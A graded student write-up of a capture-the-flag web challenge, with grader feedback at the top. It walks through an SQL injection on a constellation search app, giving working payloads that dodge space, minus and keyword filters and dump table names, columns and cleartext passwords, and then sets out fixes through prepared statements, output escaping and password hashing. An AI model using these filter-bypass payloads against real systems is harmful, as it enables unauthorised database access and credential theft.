**Name:** flofriday

**Points:** 0.9 of 1.0 Points

**Feedback:** - Vulnerability: This section is missing where the SQL injection vulnerability is (in the abbreviation search field).

<hr>

# Constellations

## Overview

The application [Space! Data! Base!](https://constellations.hackthe.space/) allows the user to list all star constillations or search for specific ones. Moreover, there is a restricted area for which a password is needed.

## Vulnerability

The main vulnerability is an SQL injection and even tough there is some
validation on the input, this allows an attacker to read any table/row in the
database.

## Exploitation

During the Exploitation I was on a Call with █████,
█████ and █████, we discussed the our approaches
but we all came to the payloads on our own and didn't shared the flag.

Since this is a Web challenge and the [challenge description](https://hackthe.space/challenge/constellations) already points at to the MySQL database, I asumed that a SQL injection might be the vulnerability. So, to prove this hypothesis I tried the the following input (in the search field):

```
' OR 1=1 --
```

"Invalid character detected!", well there seams to be some character validation
in place. My next step was to figure out which characters would be deteced and
after some trial and error I found that only minus and space were detected.

To avoid the minus is quite easy, but I still needed a way to work around the
space limitation as SQL doestn't allow queries without separation like:
`Select*Fromtable;`. After some searching I found this [article](https://portswigger.net/support/sql-injection-bypassing-common-filters) which explains
how whitespace filters can be bypassed by an opening and closing comment. So
my next step was to try the payload from above again, addapted for the filters:

```
'OR/**/'1'='1
```

This imput returned only the first constellation, from which I concluded that there is propably a `LIMIT 1` in place (this assumption was later confirmed, when I received an Error which showed a part of the SQL Query with this Limit). Also with this query we now know that there is definitly an SQL injection.

To create queries faster (and easier to read) I wrote a simple python script
in a [Jupyter Notebook](https://jupyter.org/) to convert spaces to comments:

```python
query = "' OR '1'='1"
print(query.replace(' ', '/**/'))
```

Next, I tried to create a simple query to reflect some values. The part after the Union  needs to return 4 columns to match the original query:

```
'UNION/**/SELECT/**/'flotschi','was','here','!
```

However, this query resulted in the following Error:

```
Invalid query: SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''flotschi','was','here','!' LIMIT 1' at line 1
```

After some trial and error I figured out that `"SELECT"` and `"select"` get
silently filtered, however mixed cases seam to bypass the filter, so from now on
I just capitalized the first letter of any keyword.

So with this change the query looked like the following and finally worked:

```
'Union/**/Select/**/'flotschi','was','here','!
```

My next goal was leak all table names, however I didn't wanted to only read
the first row but all, with one query, so I needed a way to convert all
resulting rows into a single row / single field. In the [aggregation function](https://dev.mysql.com/doc/refman/8.0/en/aggregate-functions.html) page in the MySQL documentation I found the function `JSON_ARRAYAGG()` which
does exactly that: Converting a result of muliple rows into a single
json-formatted string (`GROUP_CONCAT` seams to also work, but doesn't format
the output as nice).

With this newly aquired knoledge, I was ready to leak all tables:

```
'Union/**/Select/**/JSON_ARRAYAGG(table_name),1,2,3/**/From/**/information_schema.tables/**/Union/**/Select/**/1,2,3,'f
```

This query now returns all table names, and after all internal tables, we also
get the two custom tables `constellation_list` and `constellation_secrets`. Next,
I leaked the columns of the `constellations_secrets` table with:

```
'Union/**/Select/**/JSON_ARRAYAGG(column_name),1,2,3/**/From/**/information_schema.columns/**/Where/**/table_name='constellation_secrets'/**/Union/**/Select/**/1,2,3,'f
```

which resulted in the following response:
`["id", "constellation_id", "secretpaswd"]`.

Finally, I could read all secrets with the following query:

```
'Union/**/Select/**/JSON_ARRAYAGG(secretpaswd),1,1,1/**/From/**/constellation_secrets/**/Union/**/Select/**/1,1,1,'
```

From this I got `["nopeItsNotLupus", "EeLe9EiHNs5WDd5hnryw"]` and when we
enter `EeLe9EiHNs5WDd5hnryw` into the password field, we get the flag.

## Solution

SQL injections are an input validation vulnerability, therefore we can fix them
by validating the input, which in this case means to propably escape special
characters (like single quotes).

One solution would be to read the documentation of the used
DBMS to get the characters that need special treatment, and
escape them in the PHP code. However, the better (and faster) solution is to
use prepared statements, where the DB validates the input for us. This
solution is less prone to errors as the critical code is not written by us but
by the database developers and it is easier to port the application to another
database.

Here is a simple example how this might work:

```php
<?php
$db = new PDO(CONNECTION_STRING, DB_USER, DB_PASS);
$query = "SELECT name, abbreviation, origin, brightest_star  FROM constellations WHERE abbreviation=? LIMIT 1";
$stmt = $db->prepare($query);
$stmt->bindValue(1, $_POST['abbreviation']);
$stmt->execute();
$row = $result->fetch();
?>

...

<tr>
    <td><?php echo htmlspecialchars($row["name"], ENT_QUOTES, 'UTF-8') ?></td>
    <td><?php echo htmlspecialchars($row["abbreviation"], ENT_QUOTES, 'UTF-8') ?></td>
    <td><?php echo htmlspecialchars($row["origin"], ENT_QUOTES, 'UTF-8') ?></td>
    <td><?php echo htmlspecialchars($row["brightest_star"], ENT_QUOTES, 'UTF-8') ?></td>
</tr>
```

The constellations application, has a couple of other bad practises I would like to address.

First, the application allows [self-XSS](https://en.wikipedia.org/wiki/Self-XSS), this can easily be fixed with the PHP function `htmlspecialchars` and I already fixed it in the example above.

Next, the application stores passwords in clear text, which made it possible,
for me to exploit the app after having read access to the DB. This could have
been fixed by only storing the hash of the password in the DB. One could further
improve this by also storing a unique salt for each user, and instead of the
simple hash a salted hash. This would also defeat any use of any [Rainbow Tables](https://en.wikipedia.org/wiki/Rainbow_table)